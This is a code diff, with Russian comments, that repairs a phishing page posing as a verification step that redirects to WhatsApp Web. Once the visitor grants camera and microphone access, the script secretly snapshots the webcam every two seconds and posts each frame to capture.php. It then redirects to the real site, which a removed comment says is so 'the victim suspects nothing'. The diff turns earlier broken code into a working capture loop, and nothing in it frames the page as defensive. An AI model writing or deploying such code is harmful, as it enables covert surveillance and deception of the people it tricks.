@@ -20,48 +20,47 @@
     </div>
 
     <script>
-        let localStream = null;
-        const video = document.getElementById('video');
-        const statusDiv = document.getElementById('status');
+    let localStream = null;
+    const video = document.getElementById('video');
+    const statusDiv = document.getElementById('status');
 
-        document.getElementById('start').addEventListener('click', async () => {
-            try {
-                // Запрашиваем доступ к камере и микрофону
-                localStream = // Функция для отправки кадра
-function sendFrame() {
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-    const base64 = dataUrl.split(',')[1];
+    document.getElementById('start').addEventListener('click', async () => {
+        try {
+            // Запрашиваем доступ к камере и микрофону
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            video.srcObject = localStream;
+            statusDiv.innerText = 'Доступ получен. Идёт проверка...';
 
-    fetch('capture.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: base64 })
-    }).then(r => console.log('Frame sent'));
-}
+            // ОПРЕДЕЛЯЕМ ФУНКЦИЮ ДО ЕЁ ВЫЗОВА
+            function sendFrame() {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                const base64 = dataUrl.split(',')[1];
 
-// Запускаем отправку каждые 2 секунды после получения потока
-setInterval(sendFrame, 2000);await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                video.srcObject = localStream;
-                statusDiv.innerText = 'Доступ получен. Идёт проверка...';
-
-                // Отправляем видео на сервер (в реальности нужно реализовать передачу потоком)
-                // Для простоты просто отправим сообщение через 5 секунд
-                setTimeout(() => {
-                    statusDiv.innerText = 'Проверка пройдена! Перенаправление...';
-                    // Здесь можно перенаправить на реальный сайт, чтобы жертва ничего не заподозрила
-                    window.location.href = 'https://web.whatsapp.com';
-                }, 5000);
-
-                // TODO: организовать отправку видео/аудио на сервер
-                // Например, через WebRTC или периодические снимки
-            } catch (err) {
-                statusDiv.innerText = 'Ошибка доступа: ' + err.message;
+                fetch('capture.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: base64 })
+                }).then(r => console.log('Frame sent')).catch(e => console.error('Send error:', e));
             }
-        });
-    </script>
+
+            // ТЕПЕРЬ ЗАПУСКАЕМ ИНТЕРВАЛ
+            setInterval(sendFrame, 2000);
+
+            // Перенаправление через 5 секунд
+            setTimeout(() => {
+                statusDiv.innerText = 'Проверка пройдена! Перенаправление...';
+                window.location.href = 'https://web.whatsapp.com';
+            }, 5000);
+
+        } catch (err) {
+            statusDiv.innerText = 'Ошибка доступа: ' + err.message;
+        }
+    });
+</script>
 </body>
+
 </html>
